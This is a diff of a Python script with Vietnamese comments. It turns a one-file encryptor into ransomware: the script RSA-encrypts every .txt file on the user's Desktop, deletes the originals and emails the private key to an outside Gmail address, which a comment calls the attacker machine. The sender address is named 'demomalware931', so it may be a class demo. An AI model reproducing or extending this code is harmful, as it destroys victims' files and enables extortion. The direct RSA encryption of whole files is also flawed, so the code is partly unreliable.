@@ -21,33 +21,43 @@ private_key = rsa.generate_private_key(
 )
 public_key = private_key.public_key()
 
-#file se ma hoa
-input_file = 'dataquantrong.txt'
-#file sau khi da ma hoa
-output_file = 'dataquantrong.ecryptedQT'
+# Thư mục chứa các file .txt cần mã hóa
+folder_path = os.path.expanduser("~/Desktop")
 
-#dung public key ma hoa du lieu trong file can ma hoa
-with open(input_file, 'rb') as f:
-    message = f.read()
+# Duyệt qua các file trong thư mục và mã hóa tất cả các file .txt
+for filename in os.listdir(folder_path):
+    if filename.endswith(".txt"):
+        file_path = os.path.join(folder_path, filename)
+        
+        # Đọc dữ liệu từ file cần mã hóa
+        with open(file_path, 'rb') as f:
+            message = f.read()
+        
+        # Mã hóa dữ liệu sử dụng public key
+        encrypted = public_key.encrypt(
+            message,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
+        
+        # Tạo tên file mới với đuôi mở rộng EncryptedQT
+        encrypted_file_path = os.path.join(folder_path, filename[:-4] + '.encryptedqt')
+        
+        # Ghi dữ liệu đã mã hóa vào file mới
+        with open(encrypted_file_path, 'wb') as f:
+            f.write(encrypted)
 
-encrypted = public_key.encrypt(
-    message,
-    padding.OAEP(
-        mgf=padding.MGF1(algorithm=hashes.SHA256()),
-        algorithm=hashes.SHA256(),
-        label=None
-    )
-)
-
-with open(output_file, 'wb') as f:
-    f.write(encrypted)  # Viet bytes ma hoa ra output file
+        # Xóa file gốc
+        os.remove(file_path)
 
 pem = private_key.private_bytes(
     encoding=serialization.Encoding.PEM,
     format=serialization.PrivateFormat.PKCS8,
     encryption_algorithm=serialization.NoEncryption()
 )
-os.remove(input_file) # xoa file ban dau
 
 #gui khóa bí mật về phái máy tấn công
 
@@ -56,7 +66,7 @@ with open(private_key_file, 'wb') as f:
     f.write(pem)
 
 fromaddr = "demomalware931@gmail.com"
-toaddr = "vongnguyetvongnguyet@gmail.com"
+toaddr = "lovetruongan@gmail.com"
 msg = MIMEMultipart()
 msg['From'] = fromaddr
 msg['To'] = toaddr
